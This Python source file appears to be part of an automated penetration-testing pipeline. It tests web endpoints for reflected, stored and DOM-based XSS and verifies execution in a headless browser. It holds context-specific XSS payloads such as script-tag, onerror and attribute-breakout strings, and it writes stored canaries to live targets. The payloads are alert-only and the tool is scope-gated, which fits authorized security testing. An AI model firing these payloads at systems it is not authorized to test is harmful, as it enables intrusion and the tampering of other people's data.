#!/usr/bin/env python3
"""
run.py -- xss-dom-sinks entry point.

Tests endpoints for Reflected, Stored, and DOM-based XSS with context-aware
payloads, and *verifies execution* by driving Playwright and catching the
JavaScript dialog the payload fires (page.on("dialog")). Stored XSS is verified
across two Phase 3 sessions (inject as A, observe as B). Dalfox is used as a
fast initial reflection scanner when present.

SAFETY MODEL (offensive skill -- guardrails are load-bearing)
-------------------------------------------------------------
* Benign proof-only payloads. Every payload is alert()/confirm()/prompt()
  carrying a unique per-test canary. Execution is confirmed only when a dialog
  fires whose message contains that canary. No cookie theft, no fetch()/beacon
  to any host, no DOM defacement -- the payloads prove execution and nothing
  else.
* Stored XSS is a mutation. Reflected/DOM are non-persistent. Every stored
  injection writes a clearly-tagged benign canary and is recorded in
  meta.mutations (with the canary id + where) so the cleanup skill can find and
  remove it. Stored testing runs only when a write+view target is supplied.
* Scope-gated. Only in-scope endpoint hosts are tested.
* Confirmed vs suspected: reflection alone is 'suspected'; a fired dialog is
  'confirmed'.

CONTRACT
--------
* Input  : {"endpoints": [{"url","params":[],"context":"html|attr|js",
              "method":"GET|POST","view_url":"...","store_param":"..."}],
            "session_pool_spill_id": "...", "oob_domain": "...",
            "scope_policy_spill_id": "...", "config": {...}}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import re
import secrets
import shutil
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl

try:
    from playwright.async_api import async_playwright  # type: ignore
except ImportError:  # pragma: no cover
    async_playwright = None

try:
    import httpx  # type: ignore
except ImportError:  # pragma: no cover
    httpx = None

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

NAV_TIMEOUT_MS = int(os.environ.get("XSS_NAV_TIMEOUT_MS", "15000"))
DIALOG_WAIT_MS = int(os.environ.get("XSS_DIALOG_WAIT_MS", "700"))
MAX_PAYLOADS = int(os.environ.get("XSS_MAX_PAYLOADS", "4"))
HTTP_TIMEOUT = float(os.environ.get("XSS_HTTP_TIMEOUT", "20"))


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


def _inject_url(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def _set_fragment(url: str, value: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, value))


class ScopePolicy:
    def __init__(self, policy: Optional[dict], hosts: List[str]):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope:
            for h in hosts:
                if h:
                    self.in_scope += [self._c(h), self._c(f"*.{h}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


def payloads_for_context(context: str, canary: str) -> List[Tuple[str, str]]:
    """Return [(payload, context_label)] of BENIGN alert()-canary payloads."""
    a = f"alert('{canary}')"
    html = [
        (f"<script>{a}</script>", "html"),
        (f"<img src=x onerror={a}>", "html"),
        (f"<svg onload={a}>", "html"),
    ]
    attr = [
        (f'"><img src=x onerror={a}>', "attr"),
        (f'" autofocus onfocus={a} x="', "attr"),
        (f"' autofocus onfocus={a} x='", "attr"),
    ]
    js = [
        (f"';{a};//", "js"),
        (f"'-{a}-'", "js"),
        (f"</script><img src=x onerror={a}>", "js"),
    ]
    ctx = (context or "").lower()
    if ctx == "attr":
        chosen = attr + html
    elif ctx == "js":
        chosen = js + html
    elif ctx == "html":
        chosen = html + attr
    else:
        chosen = html + attr + js
    return chosen[:MAX_PAYLOADS]


class XSSTester:
    def __init__(self, endpoints: List[dict], session_pool_spill_id: Optional[str] = None,
                 oob_domain: Optional[str] = None, scope_policy_spill_id: Optional[str] = None,
                 config: Optional[dict] = None):
        self.endpoints = endpoints or []
        self.oob_domain = (oob_domain or "").strip() or None
        self.config = config or {}
        self.errors: List[Dict[str, str]] = []
        self.mutations: List[dict] = []
        self.sessions: List[dict] = []
        if session_pool_spill_id:
            try:
                data = read_spill(session_pool_spill_id)
                self.sessions = data.get("session_pool", data) if isinstance(data, dict) else data
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "load_sessions", "error": str(exc)})
        hosts = [_host_of(e.get("url", "")) for e in self.endpoints]
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, hosts)
        self._browser = None

    def _canary(self) -> str:
        return "XSS" + secrets.token_hex(4)

    def _pw_cookies(self, session: Optional[dict]) -> List[dict]:
        if not session:
            return []
        out = []
        for c in session.get("cookies", []) or []:
            if not c.get("name"):
                continue
            ck = {"name": c["name"], "value": c.get("value", ""),
                  "domain": (c.get("domain") or "").lstrip("."),
                  "path": c.get("path", "/")}
            ss = c.get("sameSite")
            if ss in ("Strict", "Lax", "None"):
                ck["sameSite"] = ss
            if ck["domain"]:
                out.append(ck)
        return out

    # -- browser verification --------------------------------------------------
    async def _browser_execute(self, url: str, canary: str,
                               session: Optional[dict] = None) -> dict:
        """Load url (optionally as a role) and report whether a dialog carrying
        the canary fired. Returns evidence (screenshot + dom snippet)."""
        result = {"executed": False, "message": "", "screenshot_b64": "", "dom": ""}
        if async_playwright is None or self._browser is None:
            return result
        ctx = await self._browser.new_context(ignore_https_errors=True)
        try:
            cookies = self._pw_cookies(session)
            if cookies:
                try:
                    await ctx.add_cookies(cookies)
                except Exception as exc:  # noqa: BLE001
                    self.errors.append({"stage": "cookies", "error": str(exc)})
            page = await ctx.new_page()
            fired = {"v": False, "msg": ""}

            def on_dialog(dialog):
                fired["v"] = True
                fired["msg"] = dialog.message
                try:
                    asyncio.create_task(dialog.dismiss())
                except Exception:  # noqa: BLE001
                    pass

            page.on("dialog", on_dialog)
            try:
                await page.goto(url, wait_until="networkidle", timeout=NAV_TIMEOUT_MS)
            except Exception:  # noqa: BLE001
                pass
            await page.wait_for_timeout(DIALOG_WAIT_MS)
            result["executed"] = fired["v"] and canary in fired["msg"]
            result["message"] = fired["msg"]
            try:
                result["screenshot_b64"] = base64.b64encode(await page.screenshot()).decode()
                result["dom"] = (await page.content())[:4000]
            except Exception:  # noqa: BLE001
                pass
        finally:
            try:
                await ctx.close()
            except Exception:  # noqa: BLE001
                pass
        return result

    def _offload_evidence(self, **kw) -> str:
        return write_spill({"captured_at": _now_iso(), **kw})

    # -- reflected -------------------------------------------------------------
    async def test_reflected(self, endpoint: dict) -> List[dict]:
        findings = []
        url = endpoint["url"]
        for param in endpoint.get("params", []) or []:
            for payload, ctx_label in self._payloads(endpoint):
                canary = self._extract_canary(payload)
                test_url = _inject_url(url, param, payload)
                reflected = False
                if httpx is not None:
                    try:
                        async with httpx.AsyncClient(timeout=HTTP_TIMEOUT, follow_redirects=True) as c:
                            r = await c.get(test_url, headers={"User-Agent": "xss-dom-sinks/1.0"})
                        reflected = payload in r.text  # unencoded reflection
                    except Exception as exc:  # noqa: BLE001
                        self.errors.append({"stage": "reflected_http", "error": f"{param}: {exc}"})
                if not reflected:
                    continue  # no server reflection -> not reflected XSS (DOM test covers client sinks)
                # server reflected it unencoded; confirm execution in a browser
                ev = await self._browser_execute(test_url, canary)
                findings.append({
                    "url": url, "xss_type": "reflected", "payload": payload,
                    "context": ctx_label, "parameter": param,
                    "confidence": "confirmed" if ev["executed"] else "suspected",
                    "executed": ev["executed"],
                    "evidence_spill_id": self._offload_evidence(
                        kind="reflected", url=test_url, param=param, payload=payload,
                        dialog=ev["message"], screenshot_b64=ev["screenshot_b64"], dom=ev["dom"]),
                })
                break  # first reflecting payload per param is enough
        return findings

    # -- DOM -------------------------------------------------------------------
    async def test_dom(self, endpoint: dict) -> List[dict]:
        findings = []
        url = endpoint["url"]
        params = endpoint.get("params", []) or [None]
        for param in params:
            for payload, ctx_label in self._payloads(endpoint):
                canary = self._extract_canary(payload)
                # try both query param and fragment (client-only) sinks
                targets = []
                if param:
                    targets.append(_inject_url(url, param, payload))
                targets.append(_set_fragment(url, payload))
                for test_url in targets:
                    ev = await self._browser_execute(test_url, canary)
                    if ev["executed"]:
                        findings.append({
                            "url": url, "xss_type": "dom", "payload": payload,
                            "context": ctx_label, "parameter": param or "#fragment",
                            "confidence": "confirmed", "executed": True,
                            "evidence_spill_id": self._offload_evidence(
                                kind="dom", url=test_url, payload=payload,
                                dialog=ev["message"], screenshot_b64=ev["screenshot_b64"], dom=ev["dom"]),
                        })
                        return findings  # one confirmed DOM sink is enough
        return findings

    # -- stored ----------------------------------------------------------------
    async def test_stored(self, endpoint: dict) -> List[dict]:
        view_url = endpoint.get("view_url")
        if not view_url:
            return []
        if not self.config.get("allow_stored", True):
            self.errors.append({"stage": "stored", "error": "stored testing disabled by config"})
            return []
        if httpx is None:
            return []
        store_url = endpoint["url"]
        store_param = endpoint.get("store_param") or (endpoint.get("params") or ["comment"])[0]
        method = (endpoint.get("method") or "POST").upper()
        session_a = self.sessions[0] if self.sessions else None
        session_b = self.sessions[1] if len(self.sessions) > 1 else session_a

        payload, ctx_label = self._payloads(endpoint)[0]
        canary = self._extract_canary(payload)
        # inject as session A
        try:
            cookies_a = {c["name"]: c.get("value", "") for c in (session_a or {}).get("cookies", [])}
            async with httpx.AsyncClient(timeout=HTTP_TIMEOUT, follow_redirects=True,
                                         cookies=cookies_a) as c:
                if method == "GET":
                    await c.get(_inject_url(store_url, store_param, payload))
                else:
                    await c.post(store_url, data={store_param: payload})
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "stored_inject", "error": str(exc)})
            return []
        # record the mutation for cleanup (benign canary)
        self.mutations.append({"type": "stored_xss_canary", "canary": canary,
                               "store_url": store_url, "param": store_param,
                               "payload": payload, "at": _now_iso(),
                               "note": "benign alert() canary; remove during cleanup"})
        # observe as session B
        ev = await self._browser_execute(view_url, canary, session=session_b)
        if ev["executed"]:
            return [{
                "url": view_url, "xss_type": "stored", "payload": payload,
                "context": ctx_label, "parameter": store_param,
                "confidence": "confirmed", "executed": True,
                "cross_session": bool(session_b and session_b is not session_a),
                "evidence_spill_id": self._offload_evidence(
                    kind="stored", store_url=store_url, view_url=view_url, payload=payload,
                    canary=canary, dialog=ev["message"],
                    screenshot_b64=ev["screenshot_b64"], dom=ev["dom"]),
            }]
        # stored but not observed executing -> suspected (still a mutation made)
        return [{
            "url": view_url, "xss_type": "stored", "payload": payload,
            "context": ctx_label, "parameter": store_param,
            "confidence": "suspected", "executed": False,
            "evidence_spill_id": self._offload_evidence(
                kind="stored_unverified", store_url=store_url, view_url=view_url,
                payload=payload, canary=canary, dom=ev["dom"]),
        }]

    # -- dalfox bridge (fast reflection pre-scan, optional) --------------------
    async def run_dalfox(self, url: str) -> List[str]:
        if shutil.which("dalfox") is None:
            return []
        try:
            proc = await asyncio.create_subprocess_exec(
                "dalfox", "url", url, "--format", "json", "--no-color", "--silence",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            out, _ = await asyncio.wait_for(proc.communicate(), 120)
            data = json.loads(out.decode("utf-8", "replace") or "[]")
            return [d.get("data", "") for d in data] if isinstance(data, list) else []
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "dalfox", "error": str(exc)})
            return []

    # -- helpers ---------------------------------------------------------------
    def _payloads(self, endpoint: dict) -> List[Tuple[str, str]]:
        return payloads_for_context(endpoint.get("context"), self._canary())

    @staticmethod
    def _extract_canary(payload: str) -> str:
        m = re.search(r"XSS[0-9a-f]{8}", payload)
        return m.group(0) if m else ""

    # -- orchestration ---------------------------------------------------------
    async def run(self) -> dict:
        started = time.time()
        findings: List[dict] = []
        if async_playwright is None:
            self.errors.append({"stage": "launch", "error": "playwright not installed"})
            return self._artifact(findings, started, fatal=True)

        in_scope_eps = []
        for ep in self.endpoints:
            if self.scope.allowed(_host_of(ep.get("url", ""))):
                in_scope_eps.append(ep)
            else:
                self.errors.append({"stage": "scope", "error": f"out of scope: {ep.get('url')}"})
        if not in_scope_eps:
            self.errors.append({"stage": "input", "error": "no in-scope endpoints"})
            return self._artifact(findings, started, fatal=True)

        try:
            async with async_playwright() as p:
                self._browser = await p.chromium.launch(headless=True, args=["--no-sandbox"])
                try:
                    for ep in in_scope_eps:
                        types = ep.get("test_types") or ["reflected", "dom", "stored"]
                        if "reflected" in types:
                            findings += await self.test_reflected(ep)
                        if "dom" in types:
                            findings += await self.test_dom(ep)
                        if "stored" in types and ep.get("view_url"):
                            findings += await self.test_stored(ep)
                finally:
                    await self._browser.close()
                    self._browser = None
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "browser", "error": repr(exc)})
        # dedup findings by (url, xss_type, parameter)
        seen, uniq = set(), []
        for f in findings:
            k = (f["url"], f["xss_type"], f.get("parameter"))
            if k not in seen:
                seen.add(k)
                uniq.append(f)
        return self._artifact(uniq, started)

    def _artifact(self, findings: List[dict], started: float, fatal: bool = False) -> dict:
        confirmed = sum(1 for f in findings if f.get("confidence") == "confirmed")
        # strip oversized internal keys already offloaded; keep contract fields + additive
        clean = [{"url": f["url"], "xss_type": f["xss_type"], "payload": f["payload"],
                  "context": f.get("context", ""), "evidence_spill_id": f["evidence_spill_id"],
                  "confidence": f.get("confidence", "suspected"),
                  "executed": f.get("executed", False), "parameter": f.get("parameter", "")}
                 for f in findings]
        return {
            "findings": clean,
            "meta": {
                "skill": "xss-dom-sinks", "version": "1.0", "phase": "5",
                "status": "error" if fatal else "ok",
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "endpoints_tested": len(self.endpoints),
                "confirmed_findings": confirmed,
                "suspected_findings": len(findings) - confirmed,
                "safety": {"payloads": "benign_alert_canary", "cookie_theft": False,
                           "external_beacon": False},
                "mutations": self.mutations,
            },
            "scope_summary": {"policy_present": self.scope.have_policy},
            "errors": self.errors,
        }


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"endpoints\":[...]}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "findings": [],
        "meta": {"skill": "xss-dom-sinks", "version": "1.0", "phase": "5",
                 "status": "error", "generated_at": _now_iso()},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    endpoints = payload.get("endpoints") or []
    if not isinstance(endpoints, list) or not endpoints:
        print(json.dumps(_error_artifact("need non-empty 'endpoints' list")))
        return 2
    tester = XSSTester(
        endpoints=endpoints,
        session_pool_spill_id=payload.get("session_pool_spill_id"),
        oob_domain=payload.get("oob_domain"),
        scope_policy_spill_id=payload.get("scope_policy_spill_id"),
        config=payload.get("config"),
    )
    artifact = await tester.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
